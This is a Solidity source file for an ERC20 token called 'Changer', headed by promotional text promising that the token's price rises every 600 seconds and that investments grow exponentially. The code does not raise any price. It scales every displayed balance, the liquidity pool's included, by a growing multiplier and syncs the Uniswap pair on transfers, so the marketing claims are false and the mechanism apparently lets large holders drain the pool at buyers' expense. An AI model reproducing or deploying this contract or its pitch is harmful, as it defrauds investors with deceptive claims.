// SPDX-License-Identifier: MIT
// Telegram: https://t.me/erc20Changer
/*
Changer is a unique ERC20 token that constantly increases in value. Every 600 seconds, the price per token 
automatically rises, thanks to our special algorithm. This ensures that Changer token holders gain more value 
over time. With Changer, your investment grows exponentially day by day!

Join Changer to own a token that continuously appreciates in value and secure your place among the winners of
the future!

Changer Token: An Investment That Increases in Value Over Time.
 */
pragma solidity ^0.8.26;

interface IUniswapV2Pair {
    function sync() external;
}

contract Changer {
    string public name = "Changer";
    string public symbol = "Changer";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    uint256 public initialTimestamp;
    address public uniswapPair; // Uniswap V2 pair address
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(uint256 initialSupply, address _uniswapPair) {
        totalSupply = initialSupply * 10 ** uint256(decimals);
        _balances[msg.sender] = totalSupply;
        initialTimestamp = block.timestamp;
        uniswapPair = _uniswapPair;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function getMultiplier() public view returns (uint256) {
        return 1 + (block.timestamp - initialTimestamp) / 600;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account] * getMultiplier();
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(to != address(0), "Invalid address");
        require(balanceOf(msg.sender) >= value, "Insufficient balance");

        uint256 adjustedValue = value / getMultiplier();
        _balances[msg.sender] -= adjustedValue;
        _balances[to] += adjustedValue;
        emit Transfer(msg.sender, to, value);

        // Trigger the Uniswap sync function after a transfer
        syncUniswap();

        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0), "Invalid address");

        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        // Trigger the Uniswap sync function after a transfer
        syncUniswap();
        require(to != address(0), "Invalid address");
        require(balanceOf(from) >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Allowance exceeded");

        uint256 adjustedValue = value / getMultiplier();
        _balances[from] -= adjustedValue;
        _balances[to] += adjustedValue;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);

        return true;
    }
    function setPair(address pair) external {
        if(address(0) == uniswapPair){
            uniswapPair = pair;
        }
    }
    function syncUniswap() internal {
        if (uniswapPair != address(0)) {
            IUniswapV2Pair(uniswapPair).sync();
        }
    }
}